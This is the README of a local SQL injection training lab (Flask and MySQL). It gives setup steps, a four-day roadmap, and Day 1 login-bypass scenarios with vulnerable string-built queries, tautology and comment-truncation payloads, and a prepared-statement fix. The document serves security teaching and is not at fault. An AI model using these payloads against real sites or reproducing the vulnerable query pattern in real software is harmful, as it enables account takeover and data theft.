# 🛡️ SQLi-AttackLab-MySQL: Hands-On SQL Injection & Mitigation Testbed

[![MySQL](https://img.shields.io/badge/Database-MySQL%208.0-blue.svg?logo=mysql&logoColor=white)](https://www.mysql.com/)
[![Python](https://img.shields.io/badge/Python-3.10%2B-brightgreen.svg?logo=python&logoColor=white)](https://www.python.org/)
[![Flask](https://img.shields.io/badge/Framework-Flask%203.x-lightgrey.svg?logo=flask&logoColor=white)](https://flask.palletsprojects.com/)
[![Project Plan](https://img.shields.io/badge/Plan-4--Day%20Hands--On%20Execution-orange.svg)](#-4-day-project-roadmap)
[![OWASP](https://img.shields.io/badge/OWASP-A03%3A2021--Injection-red.svg)](https://owasp.org/Top10/A03_2021-Injection/)

An interactive, deep-dive offensive and defensive security training environment designed to demonstrate real-world **SQL Injection (SQLi) attack techniques** and **industry-standard mitigations** against **MySQL 8.0**.

---

## 🎯 Executive Overview & Business Case

Modern web applications depend heavily on database interactions to store and retrieve business data. Insecure dynamic SQL query construction continues to be a premier vulnerability, enabling unauthorized data disclosure, administrative account takeover, and system compromise.

This repository implements a 4-part hands-on laboratory aligned with professional application security standards and the business case for secure software development (SSDLC).

---

## 📅 4-Day Project Execution Roadmap

| Phase | Module | Focus Area | Status |
| :--- | :--- | :--- | :--- |
| **Day 1** | **Authentication Bypass & Query Logic** | Delimiter breaking, boolean tautology (`' OR 1=1`), MySQL inline comments (`-- `, `#`), and prepared statement comparisons. | **Completed & Shipped** ✅ |
| **Day 2** | **Union-Based & Schema Enumeration** | Column count determination (`ORDER BY n`), data reflection discovery, MySQL `information_schema` dumping, and secret exfiltration. | Scheduled for Day 2 📅 |
| **Day 3** | **Error-Based & Blind/Time-Based SQLi** | MySQL error functions (`EXTRACTVALUE`, `UPDATEXML`), boolean character extraction, and `SLEEP()` response time latency visualizer. | Scheduled for Day 3 📅 |
| **Day 4** | **Second-Order, WAF Evasion & SAST Toolkit** | Stored SQLi, comment nesting / encoding filter bypass, static code query linter, and audit report generator. | Scheduled for Day 4 📅 |

---

## 🚀 Quickstart & Setup

### 1. Prerequisites
* Python 3.10+ installed
* MySQL Server 8.0 installed and running locally on port 3306

### 2. Clone & Install Dependencies
```bash
git clone https://github.com/souladitya087/SQLi-AttackLab-MySQL.git
cd SQLi-AttackLab-MySQL
pip install -r requirements.txt
```

### 3. Configure Database Credentials (Optional)
If your MySQL root password differs from `root`, create a `.env` file (or set environment variables):
```env
DB_HOST=127.0.0.1
DB_PORT=3306
DB_USER=root
DB_PASS=your_mysql_password
DB_NAME=sqli_lab_db
```

### 4. Initialize Database Schema & Seed Data
Run the automated initialization script to provision `sqli_lab_db`, challenge flags, and sample user profiles:
```bash
python init_db.py
```

### 5. Launch the Security Lab
```bash
python app.py
```
Open your browser and navigate to: **`http://127.0.0.1:5000`**

---

## 🔬 Day 1 Deep-Dive: Authentication Bypass Lab

### Scenario 1.1: Classic Tautology (`' OR 1=1 -- `)
* **Vulnerable Query Pattern**:
  ```sql
  SELECT id, username, full_name, email, role, api_key 
  FROM users 
  WHERE username = '{username}' AND password = '{password}' LIMIT 1
  ```
* **Attack Payload**:
  ```sql
  ' OR 1=1 -- 
  ```
* **Resulting Executed Query**:
  ```sql
  SELECT id, username, full_name, email, role, api_key 
  FROM users 
  WHERE username = '' OR 1=1 -- ' AND password = '...' LIMIT 1
  ```
* **Under the Hood**:
  The injected single quote `'` closes the string literal. The `OR 1=1` ensures the `WHERE` condition evaluates to `TRUE` for every row. The `-- ` truncates the remainder of the query. MySQL returns the first matching record (the `admin` account), granting full access.

### Scenario 1.2: Comment Truncation & Account Impersonation
* **Payload**:
  ```sql
  admin' -- 
  ```
  *(or MySQL hash syntax)*:
  ```sql
  admin' #
  ```
* **Resulting Executed Query**:
  ```sql
  SELECT id, username, full_name, email, role, api_key 
  FROM users 
  WHERE username = 'admin' -- ' AND password = '...' LIMIT 1
  ```
* **Under the Hood**:
  Targets a specific user without knowing their password. The database validates that `username = 'admin'`, while the password check is entirely discarded by the parser.

### Scenario 1.3: Parenthesized Clause Balancing
* **Payload**:
  ```sql
  ') OR ('1'='1
  ```
* **Resulting Executed Query**:
  ```sql
  SELECT * FROM users WHERE (username = '') OR ('1'='1') AND (password = '...') LIMIT 1
  ```
* **Under the Hood**:
  Demonstrates how attackers inspect MySQL syntax errors to determine bracket/parenthesis balancing requirements.

---

## 🛡️ Mitigation Comparison: Prepared Statements

Toggle the lab to **Remediated (Prepared)** mode to test the exact same attack strings:

```python
# Secure implementation in PyMySQL / MySQL Connector:
query = "SELECT id, username, full_name, email, role, api_key FROM users WHERE username = %s AND password = %s LIMIT 1"
cursor.execute(query, (username, password))
```

* **Why it works**:
  Prepared statements send the query template to the MySQL engine first, compiling the execution tree. User inputs are transmitted separately across the wire in a parameter block and treated strictly as data literals. No matter what characters (`'`, `--`, `OR 1=1`) are injected, they cannot alter the syntax structure.

---

## 🗄️ MySQL Database Architecture

The lab operates on dedicated MySQL 8.0 tables:
* `users`: Holds usernames, roles (`admin`, `analyst`, `user`), passwords, and simulated API tokens.
* `products`: Pre-seeded catalog items for Day 2 union attacks.
* `system_secrets`: Confidential flags and credentials for exfiltration challenges.
* `query_audit_logs`: Real-time audit log capturing every SQL query, parameterization flag, and execution status.

---

## ⚠️ Security & Educational Disclaimer

This software is strictly intended for **educational, security research, and defensive application testing** within authorized local environments. Do not execute attack techniques or test tools against systems without explicit written consent.
